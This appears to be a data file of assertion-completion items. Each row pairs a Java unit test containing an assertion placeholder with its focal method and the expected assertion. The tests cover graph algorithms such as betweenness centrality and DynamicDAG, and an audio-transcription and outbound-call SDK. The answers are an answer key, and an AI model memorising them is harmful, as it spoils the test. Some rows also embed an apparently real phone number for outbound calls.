"IOException { final int n = 1000; final String tmpBasename = File.createTempFile(DynamicDAGTest.class.getSimpleName(), ""test"").toString(); BVGraph.store(new ErdosRenyiGraph(n, 0.003), tmpBasename); final BVGraph erGraph = BVGraph.load(tmpBasename); final StronglyConnectedComponents scc = StronglyConnectedComponents.compute(erGraph, false, null); final ImmutableGraph dag = Transform.map(erGraph, scc.component); final int nDag = dag.numNodes();  final DynamicDAG<Integer> ddag = new DynamicDAG<>(3.0 / 2.0); @SuppressWarnings(""unchecked"") final DOLNode<DAGNode<Integer>>[] x = new DOLNode[nDag]; for (int i = 0; i < nDag; i++) x[i] = ddag.addNode(i); NodeIterator nodeIterator = dag.nodeIterator(); while (nodeIterator.hasNext()) { final int source = nodeIterator.nextInt(); int target; final LazyIntIterator successors = nodeIterator.successors(); while ((target = successors.nextInt()) >= 0) ddag.addArc(x[source], x[target]); } nodeIterator = dag.nodeIterator(); while (nodeIterator.hasNext()) { final int source = nodeIterator.nextInt(); int target; final LazyIntIterator successors = nodeIterator.successors(); while ((target = successors.nextInt()) >= 0) Assert.""<AssertPlaceHolder>""; } System.out.println(nDag + "" "" + scc.numberOfComponents); }
addArc(final DOLNode<DAGNode<K>> source, final DOLNode<DAGNode<K>> target) { final DOLNode<DAGNode<K>> lastInserted = visitForwardAndMove(target, source, source); if (lastInserted == null) return false; addSuccessor(source, target); return true; }"	assertTrue(DynamicOrderedList.compare(x[source], x[target]) < 0 )
"InterruptedException { for(final int size: new int[] { 10, 50, 100 }) { final ImmutableGraph graph = ArrayListMutableGraph.newDirectedCycle(size).immutableView(); final ParallelBreadthFirstBetweennessCentrality betweennessCentrality = new ParallelBreadthFirstBetweennessCentrality(graph); betweennessCentrality.compute();  final double[] expected = new double[size]; Arrays.fill(expected, (size - 1) * (size - 2) / 2.0); for(int i = size; i-- != 0;) ""<AssertPlaceHolder>""; } }
compute() throws InterruptedException { final IterationThread[] thread = new IterationThread[numberOfThreads]; for(int i = thread.length; i-- != 0;) thread[i] = new IterationThread(); final int n = graph.numNodes(); completed = false; threadState = ThreadState.VISIT; queue.clear(); cutPoints.clear(); for(int i = distance.length(); i-- != 0;) { distance.set(i, -1); sigma.set(i, 0); }  if (pl != null) { pl.start(""Starting visits...""); pl.expectedUpdates = graph.numNodes(); pl.itemsName = ""nodes""; }  barrier = new CyclicBarrier(numberOfThreads, new Runnable() { int curr = -1; @Override public void run() { nextPosition.set(0); // Thread state transitions if (threadState != ThreadState.VISIT || (curr != -1 && queue.size() == cutPoints.getInt(cutPoints.size() - 1))) { switch (threadState) { case VISIT: threadState = ThreadState.LAST_STAGE; currentBlockForLastStage = cutPoints.size() - 2; return; case LAST_STAGE: if (currentBlockForLastStage > 0) currentBlockForLastStage--; else threadState = ThreadState.CLEAR; return; case CLEAR: if (curr == n - 1) { completed = true; return; } else threadState = ThreadState.VISIT;  } }  // Either first call, or queue did not grow from the last call. if (threadState == ThreadState.VISIT && (curr == -1 || queue.size() == cutPoints.getInt(cutPoints.size() - 1))) { // Look for the first non-sink node not visited yet. do { if (pl != null) pl.update(); curr++; } while(curr < n && graph.outdegree(curr) == 0);  if (curr == n) { completed = true; return; }  queue.clear(); queue.add(curr);  cutPoints.clear(); cutPoints.add(0);  distance.set(curr, 0); sigma.set(curr, 1); }  if (threadState == ThreadState.VISIT) cutPoints.add(queue.size()); } } );  final ExecutorService executorService = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors()); final ExecutorCompletionService<Void> executorCompletionService = new ExecutorCompletionService<>(executorService);  for(int i = thread.length; i-- != 0;) executorCompletionService.submit(thread[i]);  try { for(int i = thread.length; i-- != 0;) executorCompletionService.take().get(); } catch(ExecutionException e) { stop = true; Throwable cause = e.getCause(); throw cause instanceof RuntimeException ? (RuntimeException)cause : new RuntimeException(cause.getMessage(), cause); } finally { executorService.shutdown(); } if (pl != null) pl.done(); }"	assertEquals(expected[i], betweennessCentrality.betweenness[i], 1E-12)
"InterruptedException { for(final int size: new int[] { 10, 50, 100 }) { final ImmutableGraph graph = ArrayListMutableGraph.newCompleteGraph(size, false).immutableView(); final ParallelBreadthFirstBetweennessCentrality betweennessCentrality = new ParallelBreadthFirstBetweennessCentrality(graph); betweennessCentrality.compute();  final double[] expected = new double[size]; Arrays.fill(expected, 0); for(int i = size; i-- != 0;) ""<AssertPlaceHolder>""; } }
compute() throws InterruptedException { final IterationThread[] thread = new IterationThread[numberOfThreads]; for(int i = thread.length; i-- != 0;) thread[i] = new IterationThread(); final int n = graph.numNodes(); completed = false; threadState = ThreadState.VISIT; queue.clear(); cutPoints.clear(); for(int i = distance.length(); i-- != 0;) { distance.set(i, -1); sigma.set(i, 0); }  if (pl != null) { pl.start(""Starting visits...""); pl.expectedUpdates = graph.numNodes(); pl.itemsName = ""nodes""; }  barrier = new CyclicBarrier(numberOfThreads, new Runnable() { int curr = -1; @Override public void run() { nextPosition.set(0); // Thread state transitions if (threadState != ThreadState.VISIT || (curr != -1 && queue.size() == cutPoints.getInt(cutPoints.size() - 1))) { switch (threadState) { case VISIT: threadState = ThreadState.LAST_STAGE; currentBlockForLastStage = cutPoints.size() - 2; return; case LAST_STAGE: if (currentBlockForLastStage > 0) currentBlockForLastStage--; else threadState = ThreadState.CLEAR; return; case CLEAR: if (curr == n - 1) { completed = true; return; } else threadState = ThreadState.VISIT;  } }  // Either first call, or queue did not grow from the last call. if (threadState == ThreadState.VISIT && (curr == -1 || queue.size() == cutPoints.getInt(cutPoints.size() - 1))) { // Look for the first non-sink node not visited yet. do { if (pl != null) pl.update(); curr++; } while(curr < n && graph.outdegree(curr) == 0);  if (curr == n) { completed = true; return; }  queue.clear(); queue.add(curr);  cutPoints.clear(); cutPoints.add(0);  distance.set(curr, 0); sigma.set(curr, 1); }  if (threadState == ThreadState.VISIT) cutPoints.add(queue.size()); } } );  final ExecutorService executorService = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors()); final ExecutorCompletionService<Void> executorCompletionService = new ExecutorCompletionService<>(executorService);  for(int i = thread.length; i-- != 0;) executorCompletionService.submit(thread[i]);  try { for(int i = thread.length; i-- != 0;) executorCompletionService.take().get(); } catch(ExecutionException e) { stop = true; Throwable cause = e.getCause(); throw cause instanceof RuntimeException ? (RuntimeException)cause : new RuntimeException(cause.getMessage(), cause); } finally { executorService.shutdown(); } if (pl != null) pl.done(); }"	assertEquals(expected[i], betweennessCentrality.betweenness[i], 1E-12)
"InterruptedException { for(final int p: new int[] { 10, 50, 100 }) { for(final int k: new int[] { 10, 50, 100 }) { final ArrayListMutableGraph mg = new ArrayListMutableGraph(p + k); for(int i = 0; i < k; i++) for(int j = 0; j < k; j++) if (i != j) mg.addArc(i, j); for(int i = 0; i < p; i++) mg.addArc(k + i, k + (i + 1) % p); final ImmutableGraph g = mg.immutableView();  final ParallelBreadthFirstBetweennessCentrality betweennessCentrality = new ParallelBreadthFirstBetweennessCentrality(g); betweennessCentrality.compute();  final double[] expected = new double[k + p];  for (int i = 0; i < k; i++) expected[i] = 0; for (int i = k; i < k + p; i++) expected[i] = (p - 1) * (p - 2) / 2.0;  for (int i = 0; i < k + p; i++) ""<AssertPlaceHolder>""; } } }
compute() throws InterruptedException { final IterationThread[] thread = new IterationThread[numberOfThreads]; for(int i = thread.length; i-- != 0;) thread[i] = new IterationThread(); final int n = graph.numNodes(); completed = false; threadState = ThreadState.VISIT; queue.clear(); cutPoints.clear(); for(int i = distance.length(); i-- != 0;) { distance.set(i, -1); sigma.set(i, 0); }  if (pl != null) { pl.start(""Starting visits...""); pl.expectedUpdates = graph.numNodes(); pl.itemsName = ""nodes""; }  barrier = new CyclicBarrier(numberOfThreads, new Runnable() { int curr = -1; @Override public void run() { nextPosition.set(0); // Thread state transitions if (threadState != ThreadState.VISIT || (curr != -1 && queue.size() == cutPoints.getInt(cutPoints.size() - 1))) { switch (threadState) { case VISIT: threadState = ThreadState.LAST_STAGE; currentBlockForLastStage = cutPoints.size() - 2; return; case LAST_STAGE: if (currentBlockForLastStage > 0) currentBlockForLastStage--; else threadState = ThreadState.CLEAR; return; case CLEAR: if (curr == n - 1) { completed = true; return; } else threadState = ThreadState.VISIT;  } }  // Either first call, or queue did not grow from the last call. if (threadState == ThreadState.VISIT && (curr == -1 || queue.size() == cutPoints.getInt(cutPoints.size() - 1))) { // Look for the first non-sink node not visited yet. do { if (pl != null) pl.update(); curr++; } while(curr < n && graph.outdegree(curr) == 0);  if (curr == n) { completed = true; return; }  queue.clear(); queue.add(curr);  cutPoints.clear(); cutPoints.add(0);  distance.set(curr, 0); sigma.set(curr, 1); }  if (threadState == ThreadState.VISIT) cutPoints.add(queue.size()); } } );  final ExecutorService executorService = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors()); final ExecutorCompletionService<Void> executorCompletionService = new ExecutorCompletionService<>(executorService);  for(int i = thread.length; i-- != 0;) executorCompletionService.submit(thread[i]);  try { for(int i = thread.length; i-- != 0;) executorCompletionService.take().get(); } catch(ExecutionException e) { stop = true; Throwable cause = e.getCause(); throw cause instanceof RuntimeException ? (RuntimeException)cause : new RuntimeException(cause.getMessage(), cause); } finally { executorService.shutdown(); } if (pl != null) pl.done(); }"	assertEquals(expected[i], betweennessCentrality.betweenness[i], 1E-12)
"InterruptedException { for(final int p: new int[] { 10, 50, 100 }) { for(final int k: new int[] { 10, 50, 100 }) { final ArrayListMutableGraph mg = new ArrayListMutableGraph(p + k); for(int i = 0; i < k; i++) for(int j = 0; j < k; j++) if (i != j) mg.addArc(i, j); for(int i = 0; i < p; i++) mg.addArc(k + i, k + (i + 1) % p); mg.addArc(k - 1, k); final ImmutableGraph g = mg.immutableView();  final ParallelBreadthFirstBetweennessCentrality betweennessCentrality = new ParallelBreadthFirstBetweennessCentrality(g); betweennessCentrality.compute();  final double[] expected = new double[k + p];  for (int i = 0; i < k - 1; i++) expected[i] = 0; expected[k - 1] = p * (k - 1); for (int d = 0; d < p; d++) expected[k + d] = k * (p - d - 1) + (p - 1) * (p - 2) / 2.0;  for (int i = 0; i < k + p; i++) ""<AssertPlaceHolder>""; } } }
compute() throws InterruptedException { final IterationThread[] thread = new IterationThread[numberOfThreads]; for(int i = thread.length; i-- != 0;) thread[i] = new IterationThread(); final int n = graph.numNodes(); completed = false; threadState = ThreadState.VISIT; queue.clear(); cutPoints.clear(); for(int i = distance.length(); i-- != 0;) { distance.set(i, -1); sigma.set(i, 0); }  if (pl != null) { pl.start(""Starting visits...""); pl.expectedUpdates = graph.numNodes(); pl.itemsName = ""nodes""; }  barrier = new CyclicBarrier(numberOfThreads, new Runnable() { int curr = -1; @Override public void run() { nextPosition.set(0); // Thread state transitions if (threadState != ThreadState.VISIT || (curr != -1 && queue.size() == cutPoints.getInt(cutPoints.size() - 1))) { switch (threadState) { case VISIT: threadState = ThreadState.LAST_STAGE; currentBlockForLastStage = cutPoints.size() - 2; return; case LAST_STAGE: if (currentBlockForLastStage > 0) currentBlockForLastStage--; else threadState = ThreadState.CLEAR; return; case CLEAR: if (curr == n - 1) { completed = true; return; } else threadState = ThreadState.VISIT;  } }  // Either first call, or queue did not grow from the last call. if (threadState == ThreadState.VISIT && (curr == -1 || queue.size() == cutPoints.getInt(cutPoints.size() - 1))) { // Look for the first non-sink node not visited yet. do { if (pl != null) pl.update(); curr++; } while(curr < n && graph.outdegree(curr) == 0);  if (curr == n) { completed = true; return; }  queue.clear(); queue.add(curr);  cutPoints.clear(); cutPoints.add(0);  distance.set(curr, 0); sigma.set(curr, 1); }  if (threadState == ThreadState.VISIT) cutPoints.add(queue.size()); } } );  final ExecutorService executorService = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors()); final ExecutorCompletionService<Void> executorCompletionService = new ExecutorCompletionService<>(executorService);  for(int i = thread.length; i-- != 0;) executorCompletionService.submit(thread[i]);  try { for(int i = thread.length; i-- != 0;) executorCompletionService.take().get(); } catch(ExecutionException e) { stop = true; Throwable cause = e.getCause(); throw cause instanceof RuntimeException ? (RuntimeException)cause : new RuntimeException(cause.getMessage(), cause); } finally { executorService.shutdown(); } if (pl != null) pl.done(); }"	assertEquals(expected[i], betweennessCentrality.betweenness[i], 1E-12)
"InterruptedException { for(final int p: new int[] { 10, 50, 100 }) { for(final int k: new int[] { 10, 50, 100 }) { final ArrayListMutableGraph mg = new ArrayListMutableGraph(p + k); for(int i = 0; i < k; i++) for(int j = 0; j < k; j++) if (i != j) mg.addArc(i, j); for(int i = 0; i < p; i++) mg.addArc(k + i, k + (i + 1) % p); mg.addArc(k, k - 1); final ImmutableGraph g = mg.immutableView();  final ParallelBreadthFirstBetweennessCentrality betweennessCentrality = new ParallelBreadthFirstBetweennessCentrality(g); betweennessCentrality.compute();  final double[] expected = new double[k + p];  for (int i = 0; i < k - 1; i++) expected[i] = 0; expected[k - 1] = p * (k - 1); for (int d = 0; d < p; d++) expected[k + d] = k * (d - 1 + (d == 0? p : 0)) + (p - 1) * (p - 2) / 2.0;  for (int i = 0; i < k + p; i++) ""<AssertPlaceHolder>""; } } }
compute() throws InterruptedException { final IterationThread[] thread = new IterationThread[numberOfThreads]; for(int i = thread.length; i-- != 0;) thread[i] = new IterationThread(); final int n = graph.numNodes(); completed = false; threadState = ThreadState.VISIT; queue.clear(); cutPoints.clear(); for(int i = distance.length(); i-- != 0;) { distance.set(i, -1); sigma.set(i, 0); }  if (pl != null) { pl.start(""Starting visits...""); pl.expectedUpdates = graph.numNodes(); pl.itemsName = ""nodes""; }  barrier = new CyclicBarrier(numberOfThreads, new Runnable() { int curr = -1; @Override public void run() { nextPosition.set(0); // Thread state transitions if (threadState != ThreadState.VISIT || (curr != -1 && queue.size() == cutPoints.getInt(cutPoints.size() - 1))) { switch (threadState) { case VISIT: threadState = ThreadState.LAST_STAGE; currentBlockForLastStage = cutPoints.size() - 2; return; case LAST_STAGE: if (currentBlockForLastStage > 0) currentBlockForLastStage--; else threadState = ThreadState.CLEAR; return; case CLEAR: if (curr == n - 1) { completed = true; return; } else threadState = ThreadState.VISIT;  } }  // Either first call, or queue did not grow from the last call. if (threadState == ThreadState.VISIT && (curr == -1 || queue.size() == cutPoints.getInt(cutPoints.size() - 1))) { // Look for the first non-sink node not visited yet. do { if (pl != null) pl.update(); curr++; } while(curr < n && graph.outdegree(curr) == 0);  if (curr == n) { completed = true; return; }  queue.clear(); queue.add(curr);  cutPoints.clear(); cutPoints.add(0);  distance.set(curr, 0); sigma.set(curr, 1); }  if (threadState == ThreadState.VISIT) cutPoints.add(queue.size()); } } );  final ExecutorService executorService = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors()); final ExecutorCompletionService<Void> executorCompletionService = new ExecutorCompletionService<>(executorService);  for(int i = thread.length; i-- != 0;) executorCompletionService.submit(thread[i]);  try { for(int i = thread.length; i-- != 0;) executorCompletionService.take().get(); } catch(ExecutionException e) { stop = true; Throwable cause = e.getCause(); throw cause instanceof RuntimeException ? (RuntimeException)cause : new RuntimeException(cause.getMessage(), cause); } finally { executorService.shutdown(); } if (pl != null) pl.done(); }"	assertEquals(expected[i], betweennessCentrality.betweenness[i], 1E-12)
"InterruptedException { for(final int p: new int[] { 10, 50, 100 }) { for(final int k: new int[] { 10, 50, 100 }) { final ArrayListMutableGraph mg = new ArrayListMutableGraph(p + k); for(int i = 0; i < k; i++) for(int j = 0; j < k; j++) if (i != j) mg.addArc(i, j); for(int i = 0; i < p; i++) mg.addArc(k + i, k + (i + 1) % p); mg.addArc(k, k - 1); mg.addArc(k - 1, k); final ImmutableGraph g = mg.immutableView();  final ParallelBreadthFirstBetweennessCentrality betweennessCentrality = new ParallelBreadthFirstBetweennessCentrality(g); betweennessCentrality.compute();  final double[] expected = new double[k + p];  for (int i = 0; i < k - 1; i++) expected[i] = 0; expected[k - 1] = 2 * p * (k - 1); expected[k] = 2 * k * (p - 1) + (p - 1) * (p - 2) / 2.0; for (int d = 1; d < p; d++) expected[k + d] = k * (p - 2) + (p - 1) * (p - 2) / 2.0;  for (int i = 0; i < k + p; i++) ""<AssertPlaceHolder>""; } } }
compute() throws InterruptedException { final IterationThread[] thread = new IterationThread[numberOfThreads]; for(int i = thread.length; i-- != 0;) thread[i] = new IterationThread(); final int n = graph.numNodes(); completed = false; threadState = ThreadState.VISIT; queue.clear(); cutPoints.clear(); for(int i = distance.length(); i-- != 0;) { distance.set(i, -1); sigma.set(i, 0); }  if (pl != null) { pl.start(""Starting visits...""); pl.expectedUpdates = graph.numNodes(); pl.itemsName = ""nodes""; }  barrier = new CyclicBarrier(numberOfThreads, new Runnable() { int curr = -1; @Override public void run() { nextPosition.set(0); // Thread state transitions if (threadState != ThreadState.VISIT || (curr != -1 && queue.size() == cutPoints.getInt(cutPoints.size() - 1))) { switch (threadState) { case VISIT: threadState = ThreadState.LAST_STAGE; currentBlockForLastStage = cutPoints.size() - 2; return; case LAST_STAGE: if (currentBlockForLastStage > 0) currentBlockForLastStage--; else threadState = ThreadState.CLEAR; return; case CLEAR: if (curr == n - 1) { completed = true; return; } else threadState = ThreadState.VISIT;  } }  // Either first call, or queue did not grow from the last call. if (threadState == ThreadState.VISIT && (curr == -1 || queue.size() == cutPoints.getInt(cutPoints.size() - 1))) { // Look for the first non-sink node not visited yet. do { if (pl != null) pl.update(); curr++; } while(curr < n && graph.outdegree(curr) == 0);  if (curr == n) { completed = true; return; }  queue.clear(); queue.add(curr);  cutPoints.clear(); cutPoints.add(0);  distance.set(curr, 0); sigma.set(curr, 1); }  if (threadState == ThreadState.VISIT) cutPoints.add(queue.size()); } } );  final ExecutorService executorService = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors()); final ExecutorCompletionService<Void> executorCompletionService = new ExecutorCompletionService<>(executorService);  for(int i = thread.length; i-- != 0;) executorCompletionService.submit(thread[i]);  try { for(int i = thread.length; i-- != 0;) executorCompletionService.take().get(); } catch(ExecutionException e) { stop = true; Throwable cause = e.getCause(); throw cause instanceof RuntimeException ? (RuntimeException)cause : new RuntimeException(cause.getMessage(), cause); } finally { executorService.shutdown(); } if (pl != null) pl.done(); }"	assertEquals(expected[i], betweennessCentrality.betweenness[i], 1E-12)
"InterruptedException { for (final double p: new double[] { .1, .2, .5, .7 }) for(final int size: new int[] { 10, 50, 100 }) { // TODO refactor when symmetrize will return a copiable graph final ImmutableGraph graph = new ArrayListMutableGraph(new ErdosRenyiGraph(size, p, 0, false)).immutableView(); final ParallelBreadthFirstBetweennessCentrality betweennessCentrality = new ParallelBreadthFirstBetweennessCentrality(graph); betweennessCentrality.compute();  final JungAdapter jungGraph = new JungAdapter(graph, new ArrayListMutableGraph(Transform.transpose(graph)).immutableView()); final edu.uci.ics.jung.algorithms.importance.BetweennessCentrality<Integer, Long> jungParallelBreadthFirstBetweennessCentrality = new edu.uci.ics.jung.algorithms.importance.BetweennessCentrality<>(jungGraph); jungParallelBreadthFirstBetweennessCentrality.setRemoveRankScoresOnFinalize(false); jungParallelBreadthFirstBetweennessCentrality.evaluate();  final double[] jungBetweenness = new double[size];  for (int i = 0; i < size; i++) jungBetweenness[i] = jungParallelBreadthFirstBetweennessCentrality.getVertexRankScore(Integer.valueOf(i)); for(int i = 0; i < size; i++) ""<AssertPlaceHolder>""; } }
compute() throws InterruptedException { final IterationThread[] thread = new IterationThread[numberOfThreads]; for(int i = thread.length; i-- != 0;) thread[i] = new IterationThread(); final int n = graph.numNodes(); completed = false; threadState = ThreadState.VISIT; queue.clear(); cutPoints.clear(); for(int i = distance.length(); i-- != 0;) { distance.set(i, -1); sigma.set(i, 0); }  if (pl != null) { pl.start(""Starting visits...""); pl.expectedUpdates = graph.numNodes(); pl.itemsName = ""nodes""; }  barrier = new CyclicBarrier(numberOfThreads, new Runnable() { int curr = -1; @Override public void run() { nextPosition.set(0); // Thread state transitions if (threadState != ThreadState.VISIT || (curr != -1 && queue.size() == cutPoints.getInt(cutPoints.size() - 1))) { switch (threadState) { case VISIT: threadState = ThreadState.LAST_STAGE; currentBlockForLastStage = cutPoints.size() - 2; return; case LAST_STAGE: if (currentBlockForLastStage > 0) currentBlockForLastStage--; else threadState = ThreadState.CLEAR; return; case CLEAR: if (curr == n - 1) { completed = true; return; } else threadState = ThreadState.VISIT;  } }  // Either first call, or queue did not grow from the last call. if (threadState == ThreadState.VISIT && (curr == -1 || queue.size() == cutPoints.getInt(cutPoints.size() - 1))) { // Look for the first non-sink node not visited yet. do { if (pl != null) pl.update(); curr++; } while(curr < n && graph.outdegree(curr) == 0);  if (curr == n) { completed = true; return; }  queue.clear(); queue.add(curr);  cutPoints.clear(); cutPoints.add(0);  distance.set(curr, 0); sigma.set(curr, 1); }  if (threadState == ThreadState.VISIT) cutPoints.add(queue.size()); } } );  final ExecutorService executorService = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors()); final ExecutorCompletionService<Void> executorCompletionService = new ExecutorCompletionService<>(executorService);  for(int i = thread.length; i-- != 0;) executorCompletionService.submit(thread[i]);  try { for(int i = thread.length; i-- != 0;) executorCompletionService.take().get(); } catch(ExecutionException e) { stop = true; Throwable cause = e.getCause(); throw cause instanceof RuntimeException ? (RuntimeException)cause : new RuntimeException(cause.getMessage(), cause); } finally { executorService.shutdown(); } if (pl != null) pl.done(); }"	assertEquals(jungBetweenness[i], betweennessCentrality.betweenness[i], 1E-12)
"Exception { File audio = PowerMockito.mock(File.class); PowerMockito.when(audio.getName()).thenReturn(""test.mp3""); LfasrClient lfasrClient = new LfasrClient.Builder(appId, secretKey).language(""cn"").coreThreads(10) .maxThreads(20).role_type(""a"").connTimeout(1000).file_name(""file_name"").has_participle(""has_participle"") .has_seperate(""has_seperate"").lfasr_type(""lfasr_type"").max_alternatives(""max_alternatives"") .maxConnections(100).pd(""pd"").slice(30).soTimeout(40).speaker_number(""3"").build();  Map<String, String> param = new HashMap<>(); Whitebox.invokeMethod(lfasrClient, ""paramHandler"", param, 1234L, audio);  ""<AssertPlaceHolder>""; }
build() { LfasrClient lfasrClient = new LfasrClient(this);  if (lfasrClient.lfasrExecutorService != null) { logger.info(""lfasrExecutorService is exist""); }  synchronized (LfasrClient.class) { if (lfasrClient.lfasrExecutorService == null) { lfasrClient.lfasrExecutorService = LfasrExecutorService.build(coreThreads, maxThreads, maxConnections, connTimeout, soTimeout); } } return lfasrClient; }"	"assertEquals(""file_name"", param.get(""file_name""))"
"Exception { File audio = PowerMockito.mock(File.class); PowerMockito.whenNew(File.class).withArguments(""/file/path/a.mp3"").thenReturn(audio); PowerMockito.when(audio.exists()).thenReturn(true); PowerMockito.when(audio.length()).thenReturn(524288001L); LfasrClient lfasrClient = new LfasrClient.Builder(appId, secretKey).build(); try { lfasrClient.upload(""/file/path/a.mp3""); } catch (Exception e) { ""<AssertPlaceHolder>""; }  }
upload(String audioFilePath) throws LfasrException, SignatureException { LfasrMessage message = prepare(audioFilePath); String taskId = message.getData(); logger.info(""taskId: "" + taskId); uploadFile(taskId, audioFilePath); mergeFile(taskId); return message; }"	"assertTrue(e.getMessage().contains(""too large""))"
"Exception { LfasrClient lfasrClient = new LfasrClient.Builder(appId, secretKey).build();  File audio = PowerMockito.mock(File.class); PowerMockito.whenNew(File.class).withArguments(""/file/path/a.mp3"").thenReturn(audio); PowerMockito.when(audio.exists()).thenReturn(true); PowerMockito.when(audio.length()).thenReturn(52428800L);  PrepareTask prepareTask = PowerMockito.mock(PrepareTask.class); PowerMockito.whenNew(PrepareTask.class).withAnyArguments().thenReturn(prepareTask);  UploadTask uploadTask = PowerMockito.mock(UploadTask.class); PowerMockito.whenNew(UploadTask.class).withAnyArguments().thenReturn(uploadTask);  MergeTask mergeTask = PowerMockito.mock(MergeTask.class); PowerMockito.whenNew(MergeTask.class).withAnyArguments().thenReturn(mergeTask);   LfasrMessage message = new LfasrMessage(); String taskId = ""taskId_1132412341234""; message.setData(taskId); message.setOk(1); LfasrExecutorService lfasrExecutorService = Whitebox.getInternalState(lfasrClient, ""lfasrExecutorService""); PowerMockito.when(lfasrExecutorService.exec(prepareTask)).thenReturn(message);  FileInputStream fileInputStream = PowerMockito.mock(FileInputStream.class); PowerMockito.whenNew(FileInputStream.class).withAnyArguments().thenReturn(fileInputStream); PowerMockito.when(fileInputStream.read(Mockito.any())).thenReturn(1).thenReturn(0);  LfasrMessage returnMsg = lfasrClient.upload(""/file/path/a.mp3"");  ""<AssertPlaceHolder>""; }
upload(String audioFilePath) throws LfasrException, SignatureException { LfasrMessage message = prepare(audioFilePath); String taskId = message.getData(); logger.info(""taskId: "" + taskId); uploadFile(taskId, audioFilePath); mergeFile(taskId); return message; }"	assertEquals(1, returnMsg.getOk())
"Exception { config(); TelerobotResponse<TelerobotToken> telerobotResponse = telerobotClient.token(); String token1 = telerobotResponse.getResult().getToken(); System.out.println(""token:"" + telerobotResponse.getResult().getToken()); ""<AssertPlaceHolder>""; }
token() throws IOException { hostUrl = ""https://callapi.xfyun.cn/v1/service/v1/aicall/oauth/v1/token""; Map<String, String> body = new HashMap<>(); body.put(""app_key"", appKey); body.put(""app_secret"", appSecret); String result = connector.postByJson(hostUrl, StringUtils.gson.toJson(body)); Type jsonType = new TypeToken<TelerobotResponse<TelerobotToken>>() {}.getType(); return StringUtils.gson.fromJson(result, jsonType); }"	assertFalse(StringUtils.isNullOrEmpty(token1))
"Exception { config(); TelerobotResponse<TelerobotQuery> telerobotResponse = telerobotClient.query(token, 0); System.out.println(StringUtils.gson.toJson(telerobotResponse)); ""<AssertPlaceHolder>""; }
query(String token, Integer type) throws IOException { hostUrl = ""https://callapi.xfyun.cn/v1/service/v1/aicall/config/v1/query?token=""+token; String param = ""{""type"":"""" + type +""""}""; String result = connector.postByJson(hostUrl, param); return StringUtils.gson.fromJson(result, new TypeToken<TelerobotResponse<TelerobotQuery>>() {}.getType()); }"	assertEquals(0, telerobotResponse.getCode())
"Exception { config(); Callout callout = new Callout(); callout.setLine_num(""69101460""); callout.setRobot_id(""20023224""); callout.setCall_column(new String[]{""客户手机号码""}); callout.setCall_list(new String[][]{{""18133652338""}}); callout.setVoice_code(""60020""); TelerobotResponse<TelerobotCallout> telerobotResponse = telerobotClient.callout(token, callout); System.out.println(gson.toJson(telerobotResponse)); ""<AssertPlaceHolder>""; }
callout(String token, Callout callout) throws IOException { hostUrl = ""https://callapi.xfyun.cn/v1/service/v1/aicall/outbound/v1/task/callout?token=""+token; String result = connector.postByJson(hostUrl, StringUtils.gson.toJson(callout)); return StringUtils.gson.fromJson(result, new TypeToken<TelerobotResponse<TelerobotCallout>>() {}.getType()); }"	assertTrue(telerobotResponse.getCode() >= 0)
"Exception { config(); TaskCreate taskCreate = new TaskCreate(); taskCreate.setTask_name(""abelTest1""); taskCreate.setLine_num(""69101460""); taskCreate.setRobot_id(""20023224""); taskCreate.setTime_range(new String[]{""09:00:00-12:00:00"", ""13:00:00-17:30:00""}); taskCreate.setTime_begin(1625709600000L); TelerobotResponse<TelerobotCreate> telerobotResponse = telerobotClient.createTask(token, taskCreate); System.out.println(gson.toJson(telerobotResponse)); ""<AssertPlaceHolder>""; }
createTask(String token, TaskCreate taskCreate) throws IOException { hostUrl = ""https://callapi.xfyun.cn/v1/service/v1/aicall/outbound/v1/task/create?token=""+token; String result = connector.postByJson(hostUrl, StringUtils.gson.toJson(taskCreate)); return StringUtils.gson.fromJson(result,  new TypeToken<TelerobotResponse<TelerobotCreate>>() {}.getType()); }"	assertTrue(telerobotResponse.getCode() >= 0)
"Exception { config(); TaskInsert taskInsert = new TaskInsert(); taskInsert.setTask_id(""5853928459405440""); taskInsert.setCall_column(new String[]{""客户手机号码""}); taskInsert.setCall_list(new String[][]{{""18133652338""}}); TelerobotResponse<TelerobotCallout> telerobotResponse = telerobotClient.insertTask(token, taskInsert); System.out.println(gson.toJson(telerobotResponse)); ""<AssertPlaceHolder>""; }
insertTask(String token, TaskInsert taskInsert) throws IOException { hostUrl = ""https://callapi.xfyun.cn/v1/service/v1/aicall/outbound/v1/task/insert?token="" + token; String result = connector.postByJson(hostUrl, StringUtils.gson.toJson(taskInsert)); return StringUtils.gson.fromJson(result, new TypeToken<TelerobotResponse<TelerobotCallout>>() {}.getType()); }"	assertTrue(telerobotResponse.getCode() >= 0)
"Exception { config(); TelerobotResponse<String> telerobotResponse = telerobotClient.startTask(token, ""5853928459405440""); System.out.println(gson.toJson(telerobotResponse)); ""<AssertPlaceHolder>""; }
startTask(String token, String taskId) throws IOException { String param = ""{""task_id"":"""" + taskId +""""}""; hostUrl = ""https://callapi.xfyun.cn/v1/service/v1/aicall/outbound/v1/task/start?token=""+token; String result = connector.postByJson(hostUrl, param); return StringUtils.gson.fromJson(result, new TypeToken<TelerobotResponse<Object>>() {}.getType()); }"	assertTrue(telerobotResponse.getCode() >= 0)
"Exception { config(); TelerobotResponse<String> telerobotResponse = telerobotClient.pauseTask(token, ""5853928459405440""); System.out.println(gson.toJson(telerobotResponse)); ""<AssertPlaceHolder>""; }
pauseTask(String token, String taskId) throws IOException { String param = ""{""task_id"":"""" + taskId +""""}""; hostUrl = ""https://callapi.xfyun.cn/v1/service/v1/aicall/outbound/v1/task/pause?token=""+token; String result = connector.postByJson(hostUrl, param); return StringUtils.gson.fromJson(result, new TypeToken<TelerobotResponse<Object>>() {}.getType()); }"	assertTrue(telerobotResponse.getCode() >= 0)
"Exception { config(); TelerobotResponse<String> telerobotResponse = telerobotClient.deleteTask(token, ""5853928459405440""); System.out.println(gson.toJson(telerobotResponse)); ""<AssertPlaceHolder>""; }
